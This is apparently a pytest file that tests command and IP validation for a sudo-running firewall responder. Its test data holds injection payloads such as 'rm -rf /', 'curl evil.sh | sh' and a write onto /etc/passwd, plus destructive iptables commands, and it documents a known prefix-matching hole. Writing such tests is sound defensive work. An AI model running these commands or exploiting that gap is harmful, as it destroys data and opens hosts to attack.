"""Responder command validation.

The responder is the only component that executes with sudo, so its input validation
is the highest-value test surface in the codebase.
"""

import pytest

from backend.pipeline.responder import Responder


@pytest.fixture
def responder():
    return Responder()


# ===== IP validation =====

@pytest.mark.parametrize("ip", ["10.0.0.5", "172.28.0.10", "8.8.8.8", "::1", "2001:db8::1"])
def test_valid_ips_accepted(responder, ip):
    assert responder.validate_ip(ip) is True


@pytest.mark.parametrize("ip", [
    "unknown",
    "local",
    "999.999.999.999",
    "10.0.0.5; rm -rf /",
    "10.0.0.5 -j ACCEPT",
    "",
])
def test_invalid_ips_rejected(responder, ip):
    assert responder.validate_ip(ip) is False


# ===== Command validation =====

def test_legitimate_block_rule_accepted(responder):
    parts = responder.sanitize_and_validate_action("iptables -A PHANTOM -s 172.28.0.10 -j DROP")
    assert parts[0] == "iptables"
    assert "172.28.0.10" in parts


@pytest.mark.parametrize("payload", [
    "iptables -A PHANTOM -s 1.2.3.4 -j DROP; rm -rf /",
    "iptables -A PHANTOM -s 1.2.3.4 -j DROP && curl evil.sh | sh",
    "iptables -A PHANTOM -s $(whoami) -j DROP",
    "iptables -A PHANTOM -s `id` -j DROP",
    "iptables -A PHANTOM -s 1.2.3.4 -j DROP > /etc/passwd",
])
def test_shell_metacharacters_rejected(responder, payload):
    with pytest.raises(ValueError, match="forbidden shell metacharacter"):
        responder.sanitize_and_validate_action(payload)


@pytest.mark.parametrize("payload", [
    "rm -rf /",
    "curl http://evil.example/x.sh",
    "bash -c whoami",
    "systemctl stop firewalld",
])
def test_non_allowlisted_binaries_rejected(responder, payload):
    with pytest.raises(ValueError, match="not in allowlist"):
        responder.sanitize_and_validate_action(payload)


@pytest.mark.parametrize("payload", ["", None, 123, []])
def test_empty_or_non_string_rejected(responder, payload):
    with pytest.raises(ValueError):
        responder.sanitize_and_validate_action(payload)


# ===== Destructive-but-allowlisted commands =====
# These currently PASS validation because matching is prefix-only. Phase 1.4 closes
# this hole; until then these tests document the exposure.

DESTRUCTIVE_IPTABLES = [
    "iptables -F",                        # flush every rule on the host
    "iptables -P INPUT ACCEPT",           # default-allow all inbound traffic
    "iptables -A INPUT -j ACCEPT",        # allow everything
    "iptables -X",                        # delete all custom chains
    "iptables -D PHANTOM -s 1.2.3.4 -j DROP",  # unblock an attacker
]


@pytest.mark.parametrize("payload", DESTRUCTIVE_IPTABLES)
def test_destructive_iptables_currently_passes_prefix_check(responder, payload):
    """BASELINE — documents the Phase 1.4 vulnerability. Inverted once the fix lands."""
    parts = responder.sanitize_and_validate_action(payload)
    assert parts[0] == "iptables"
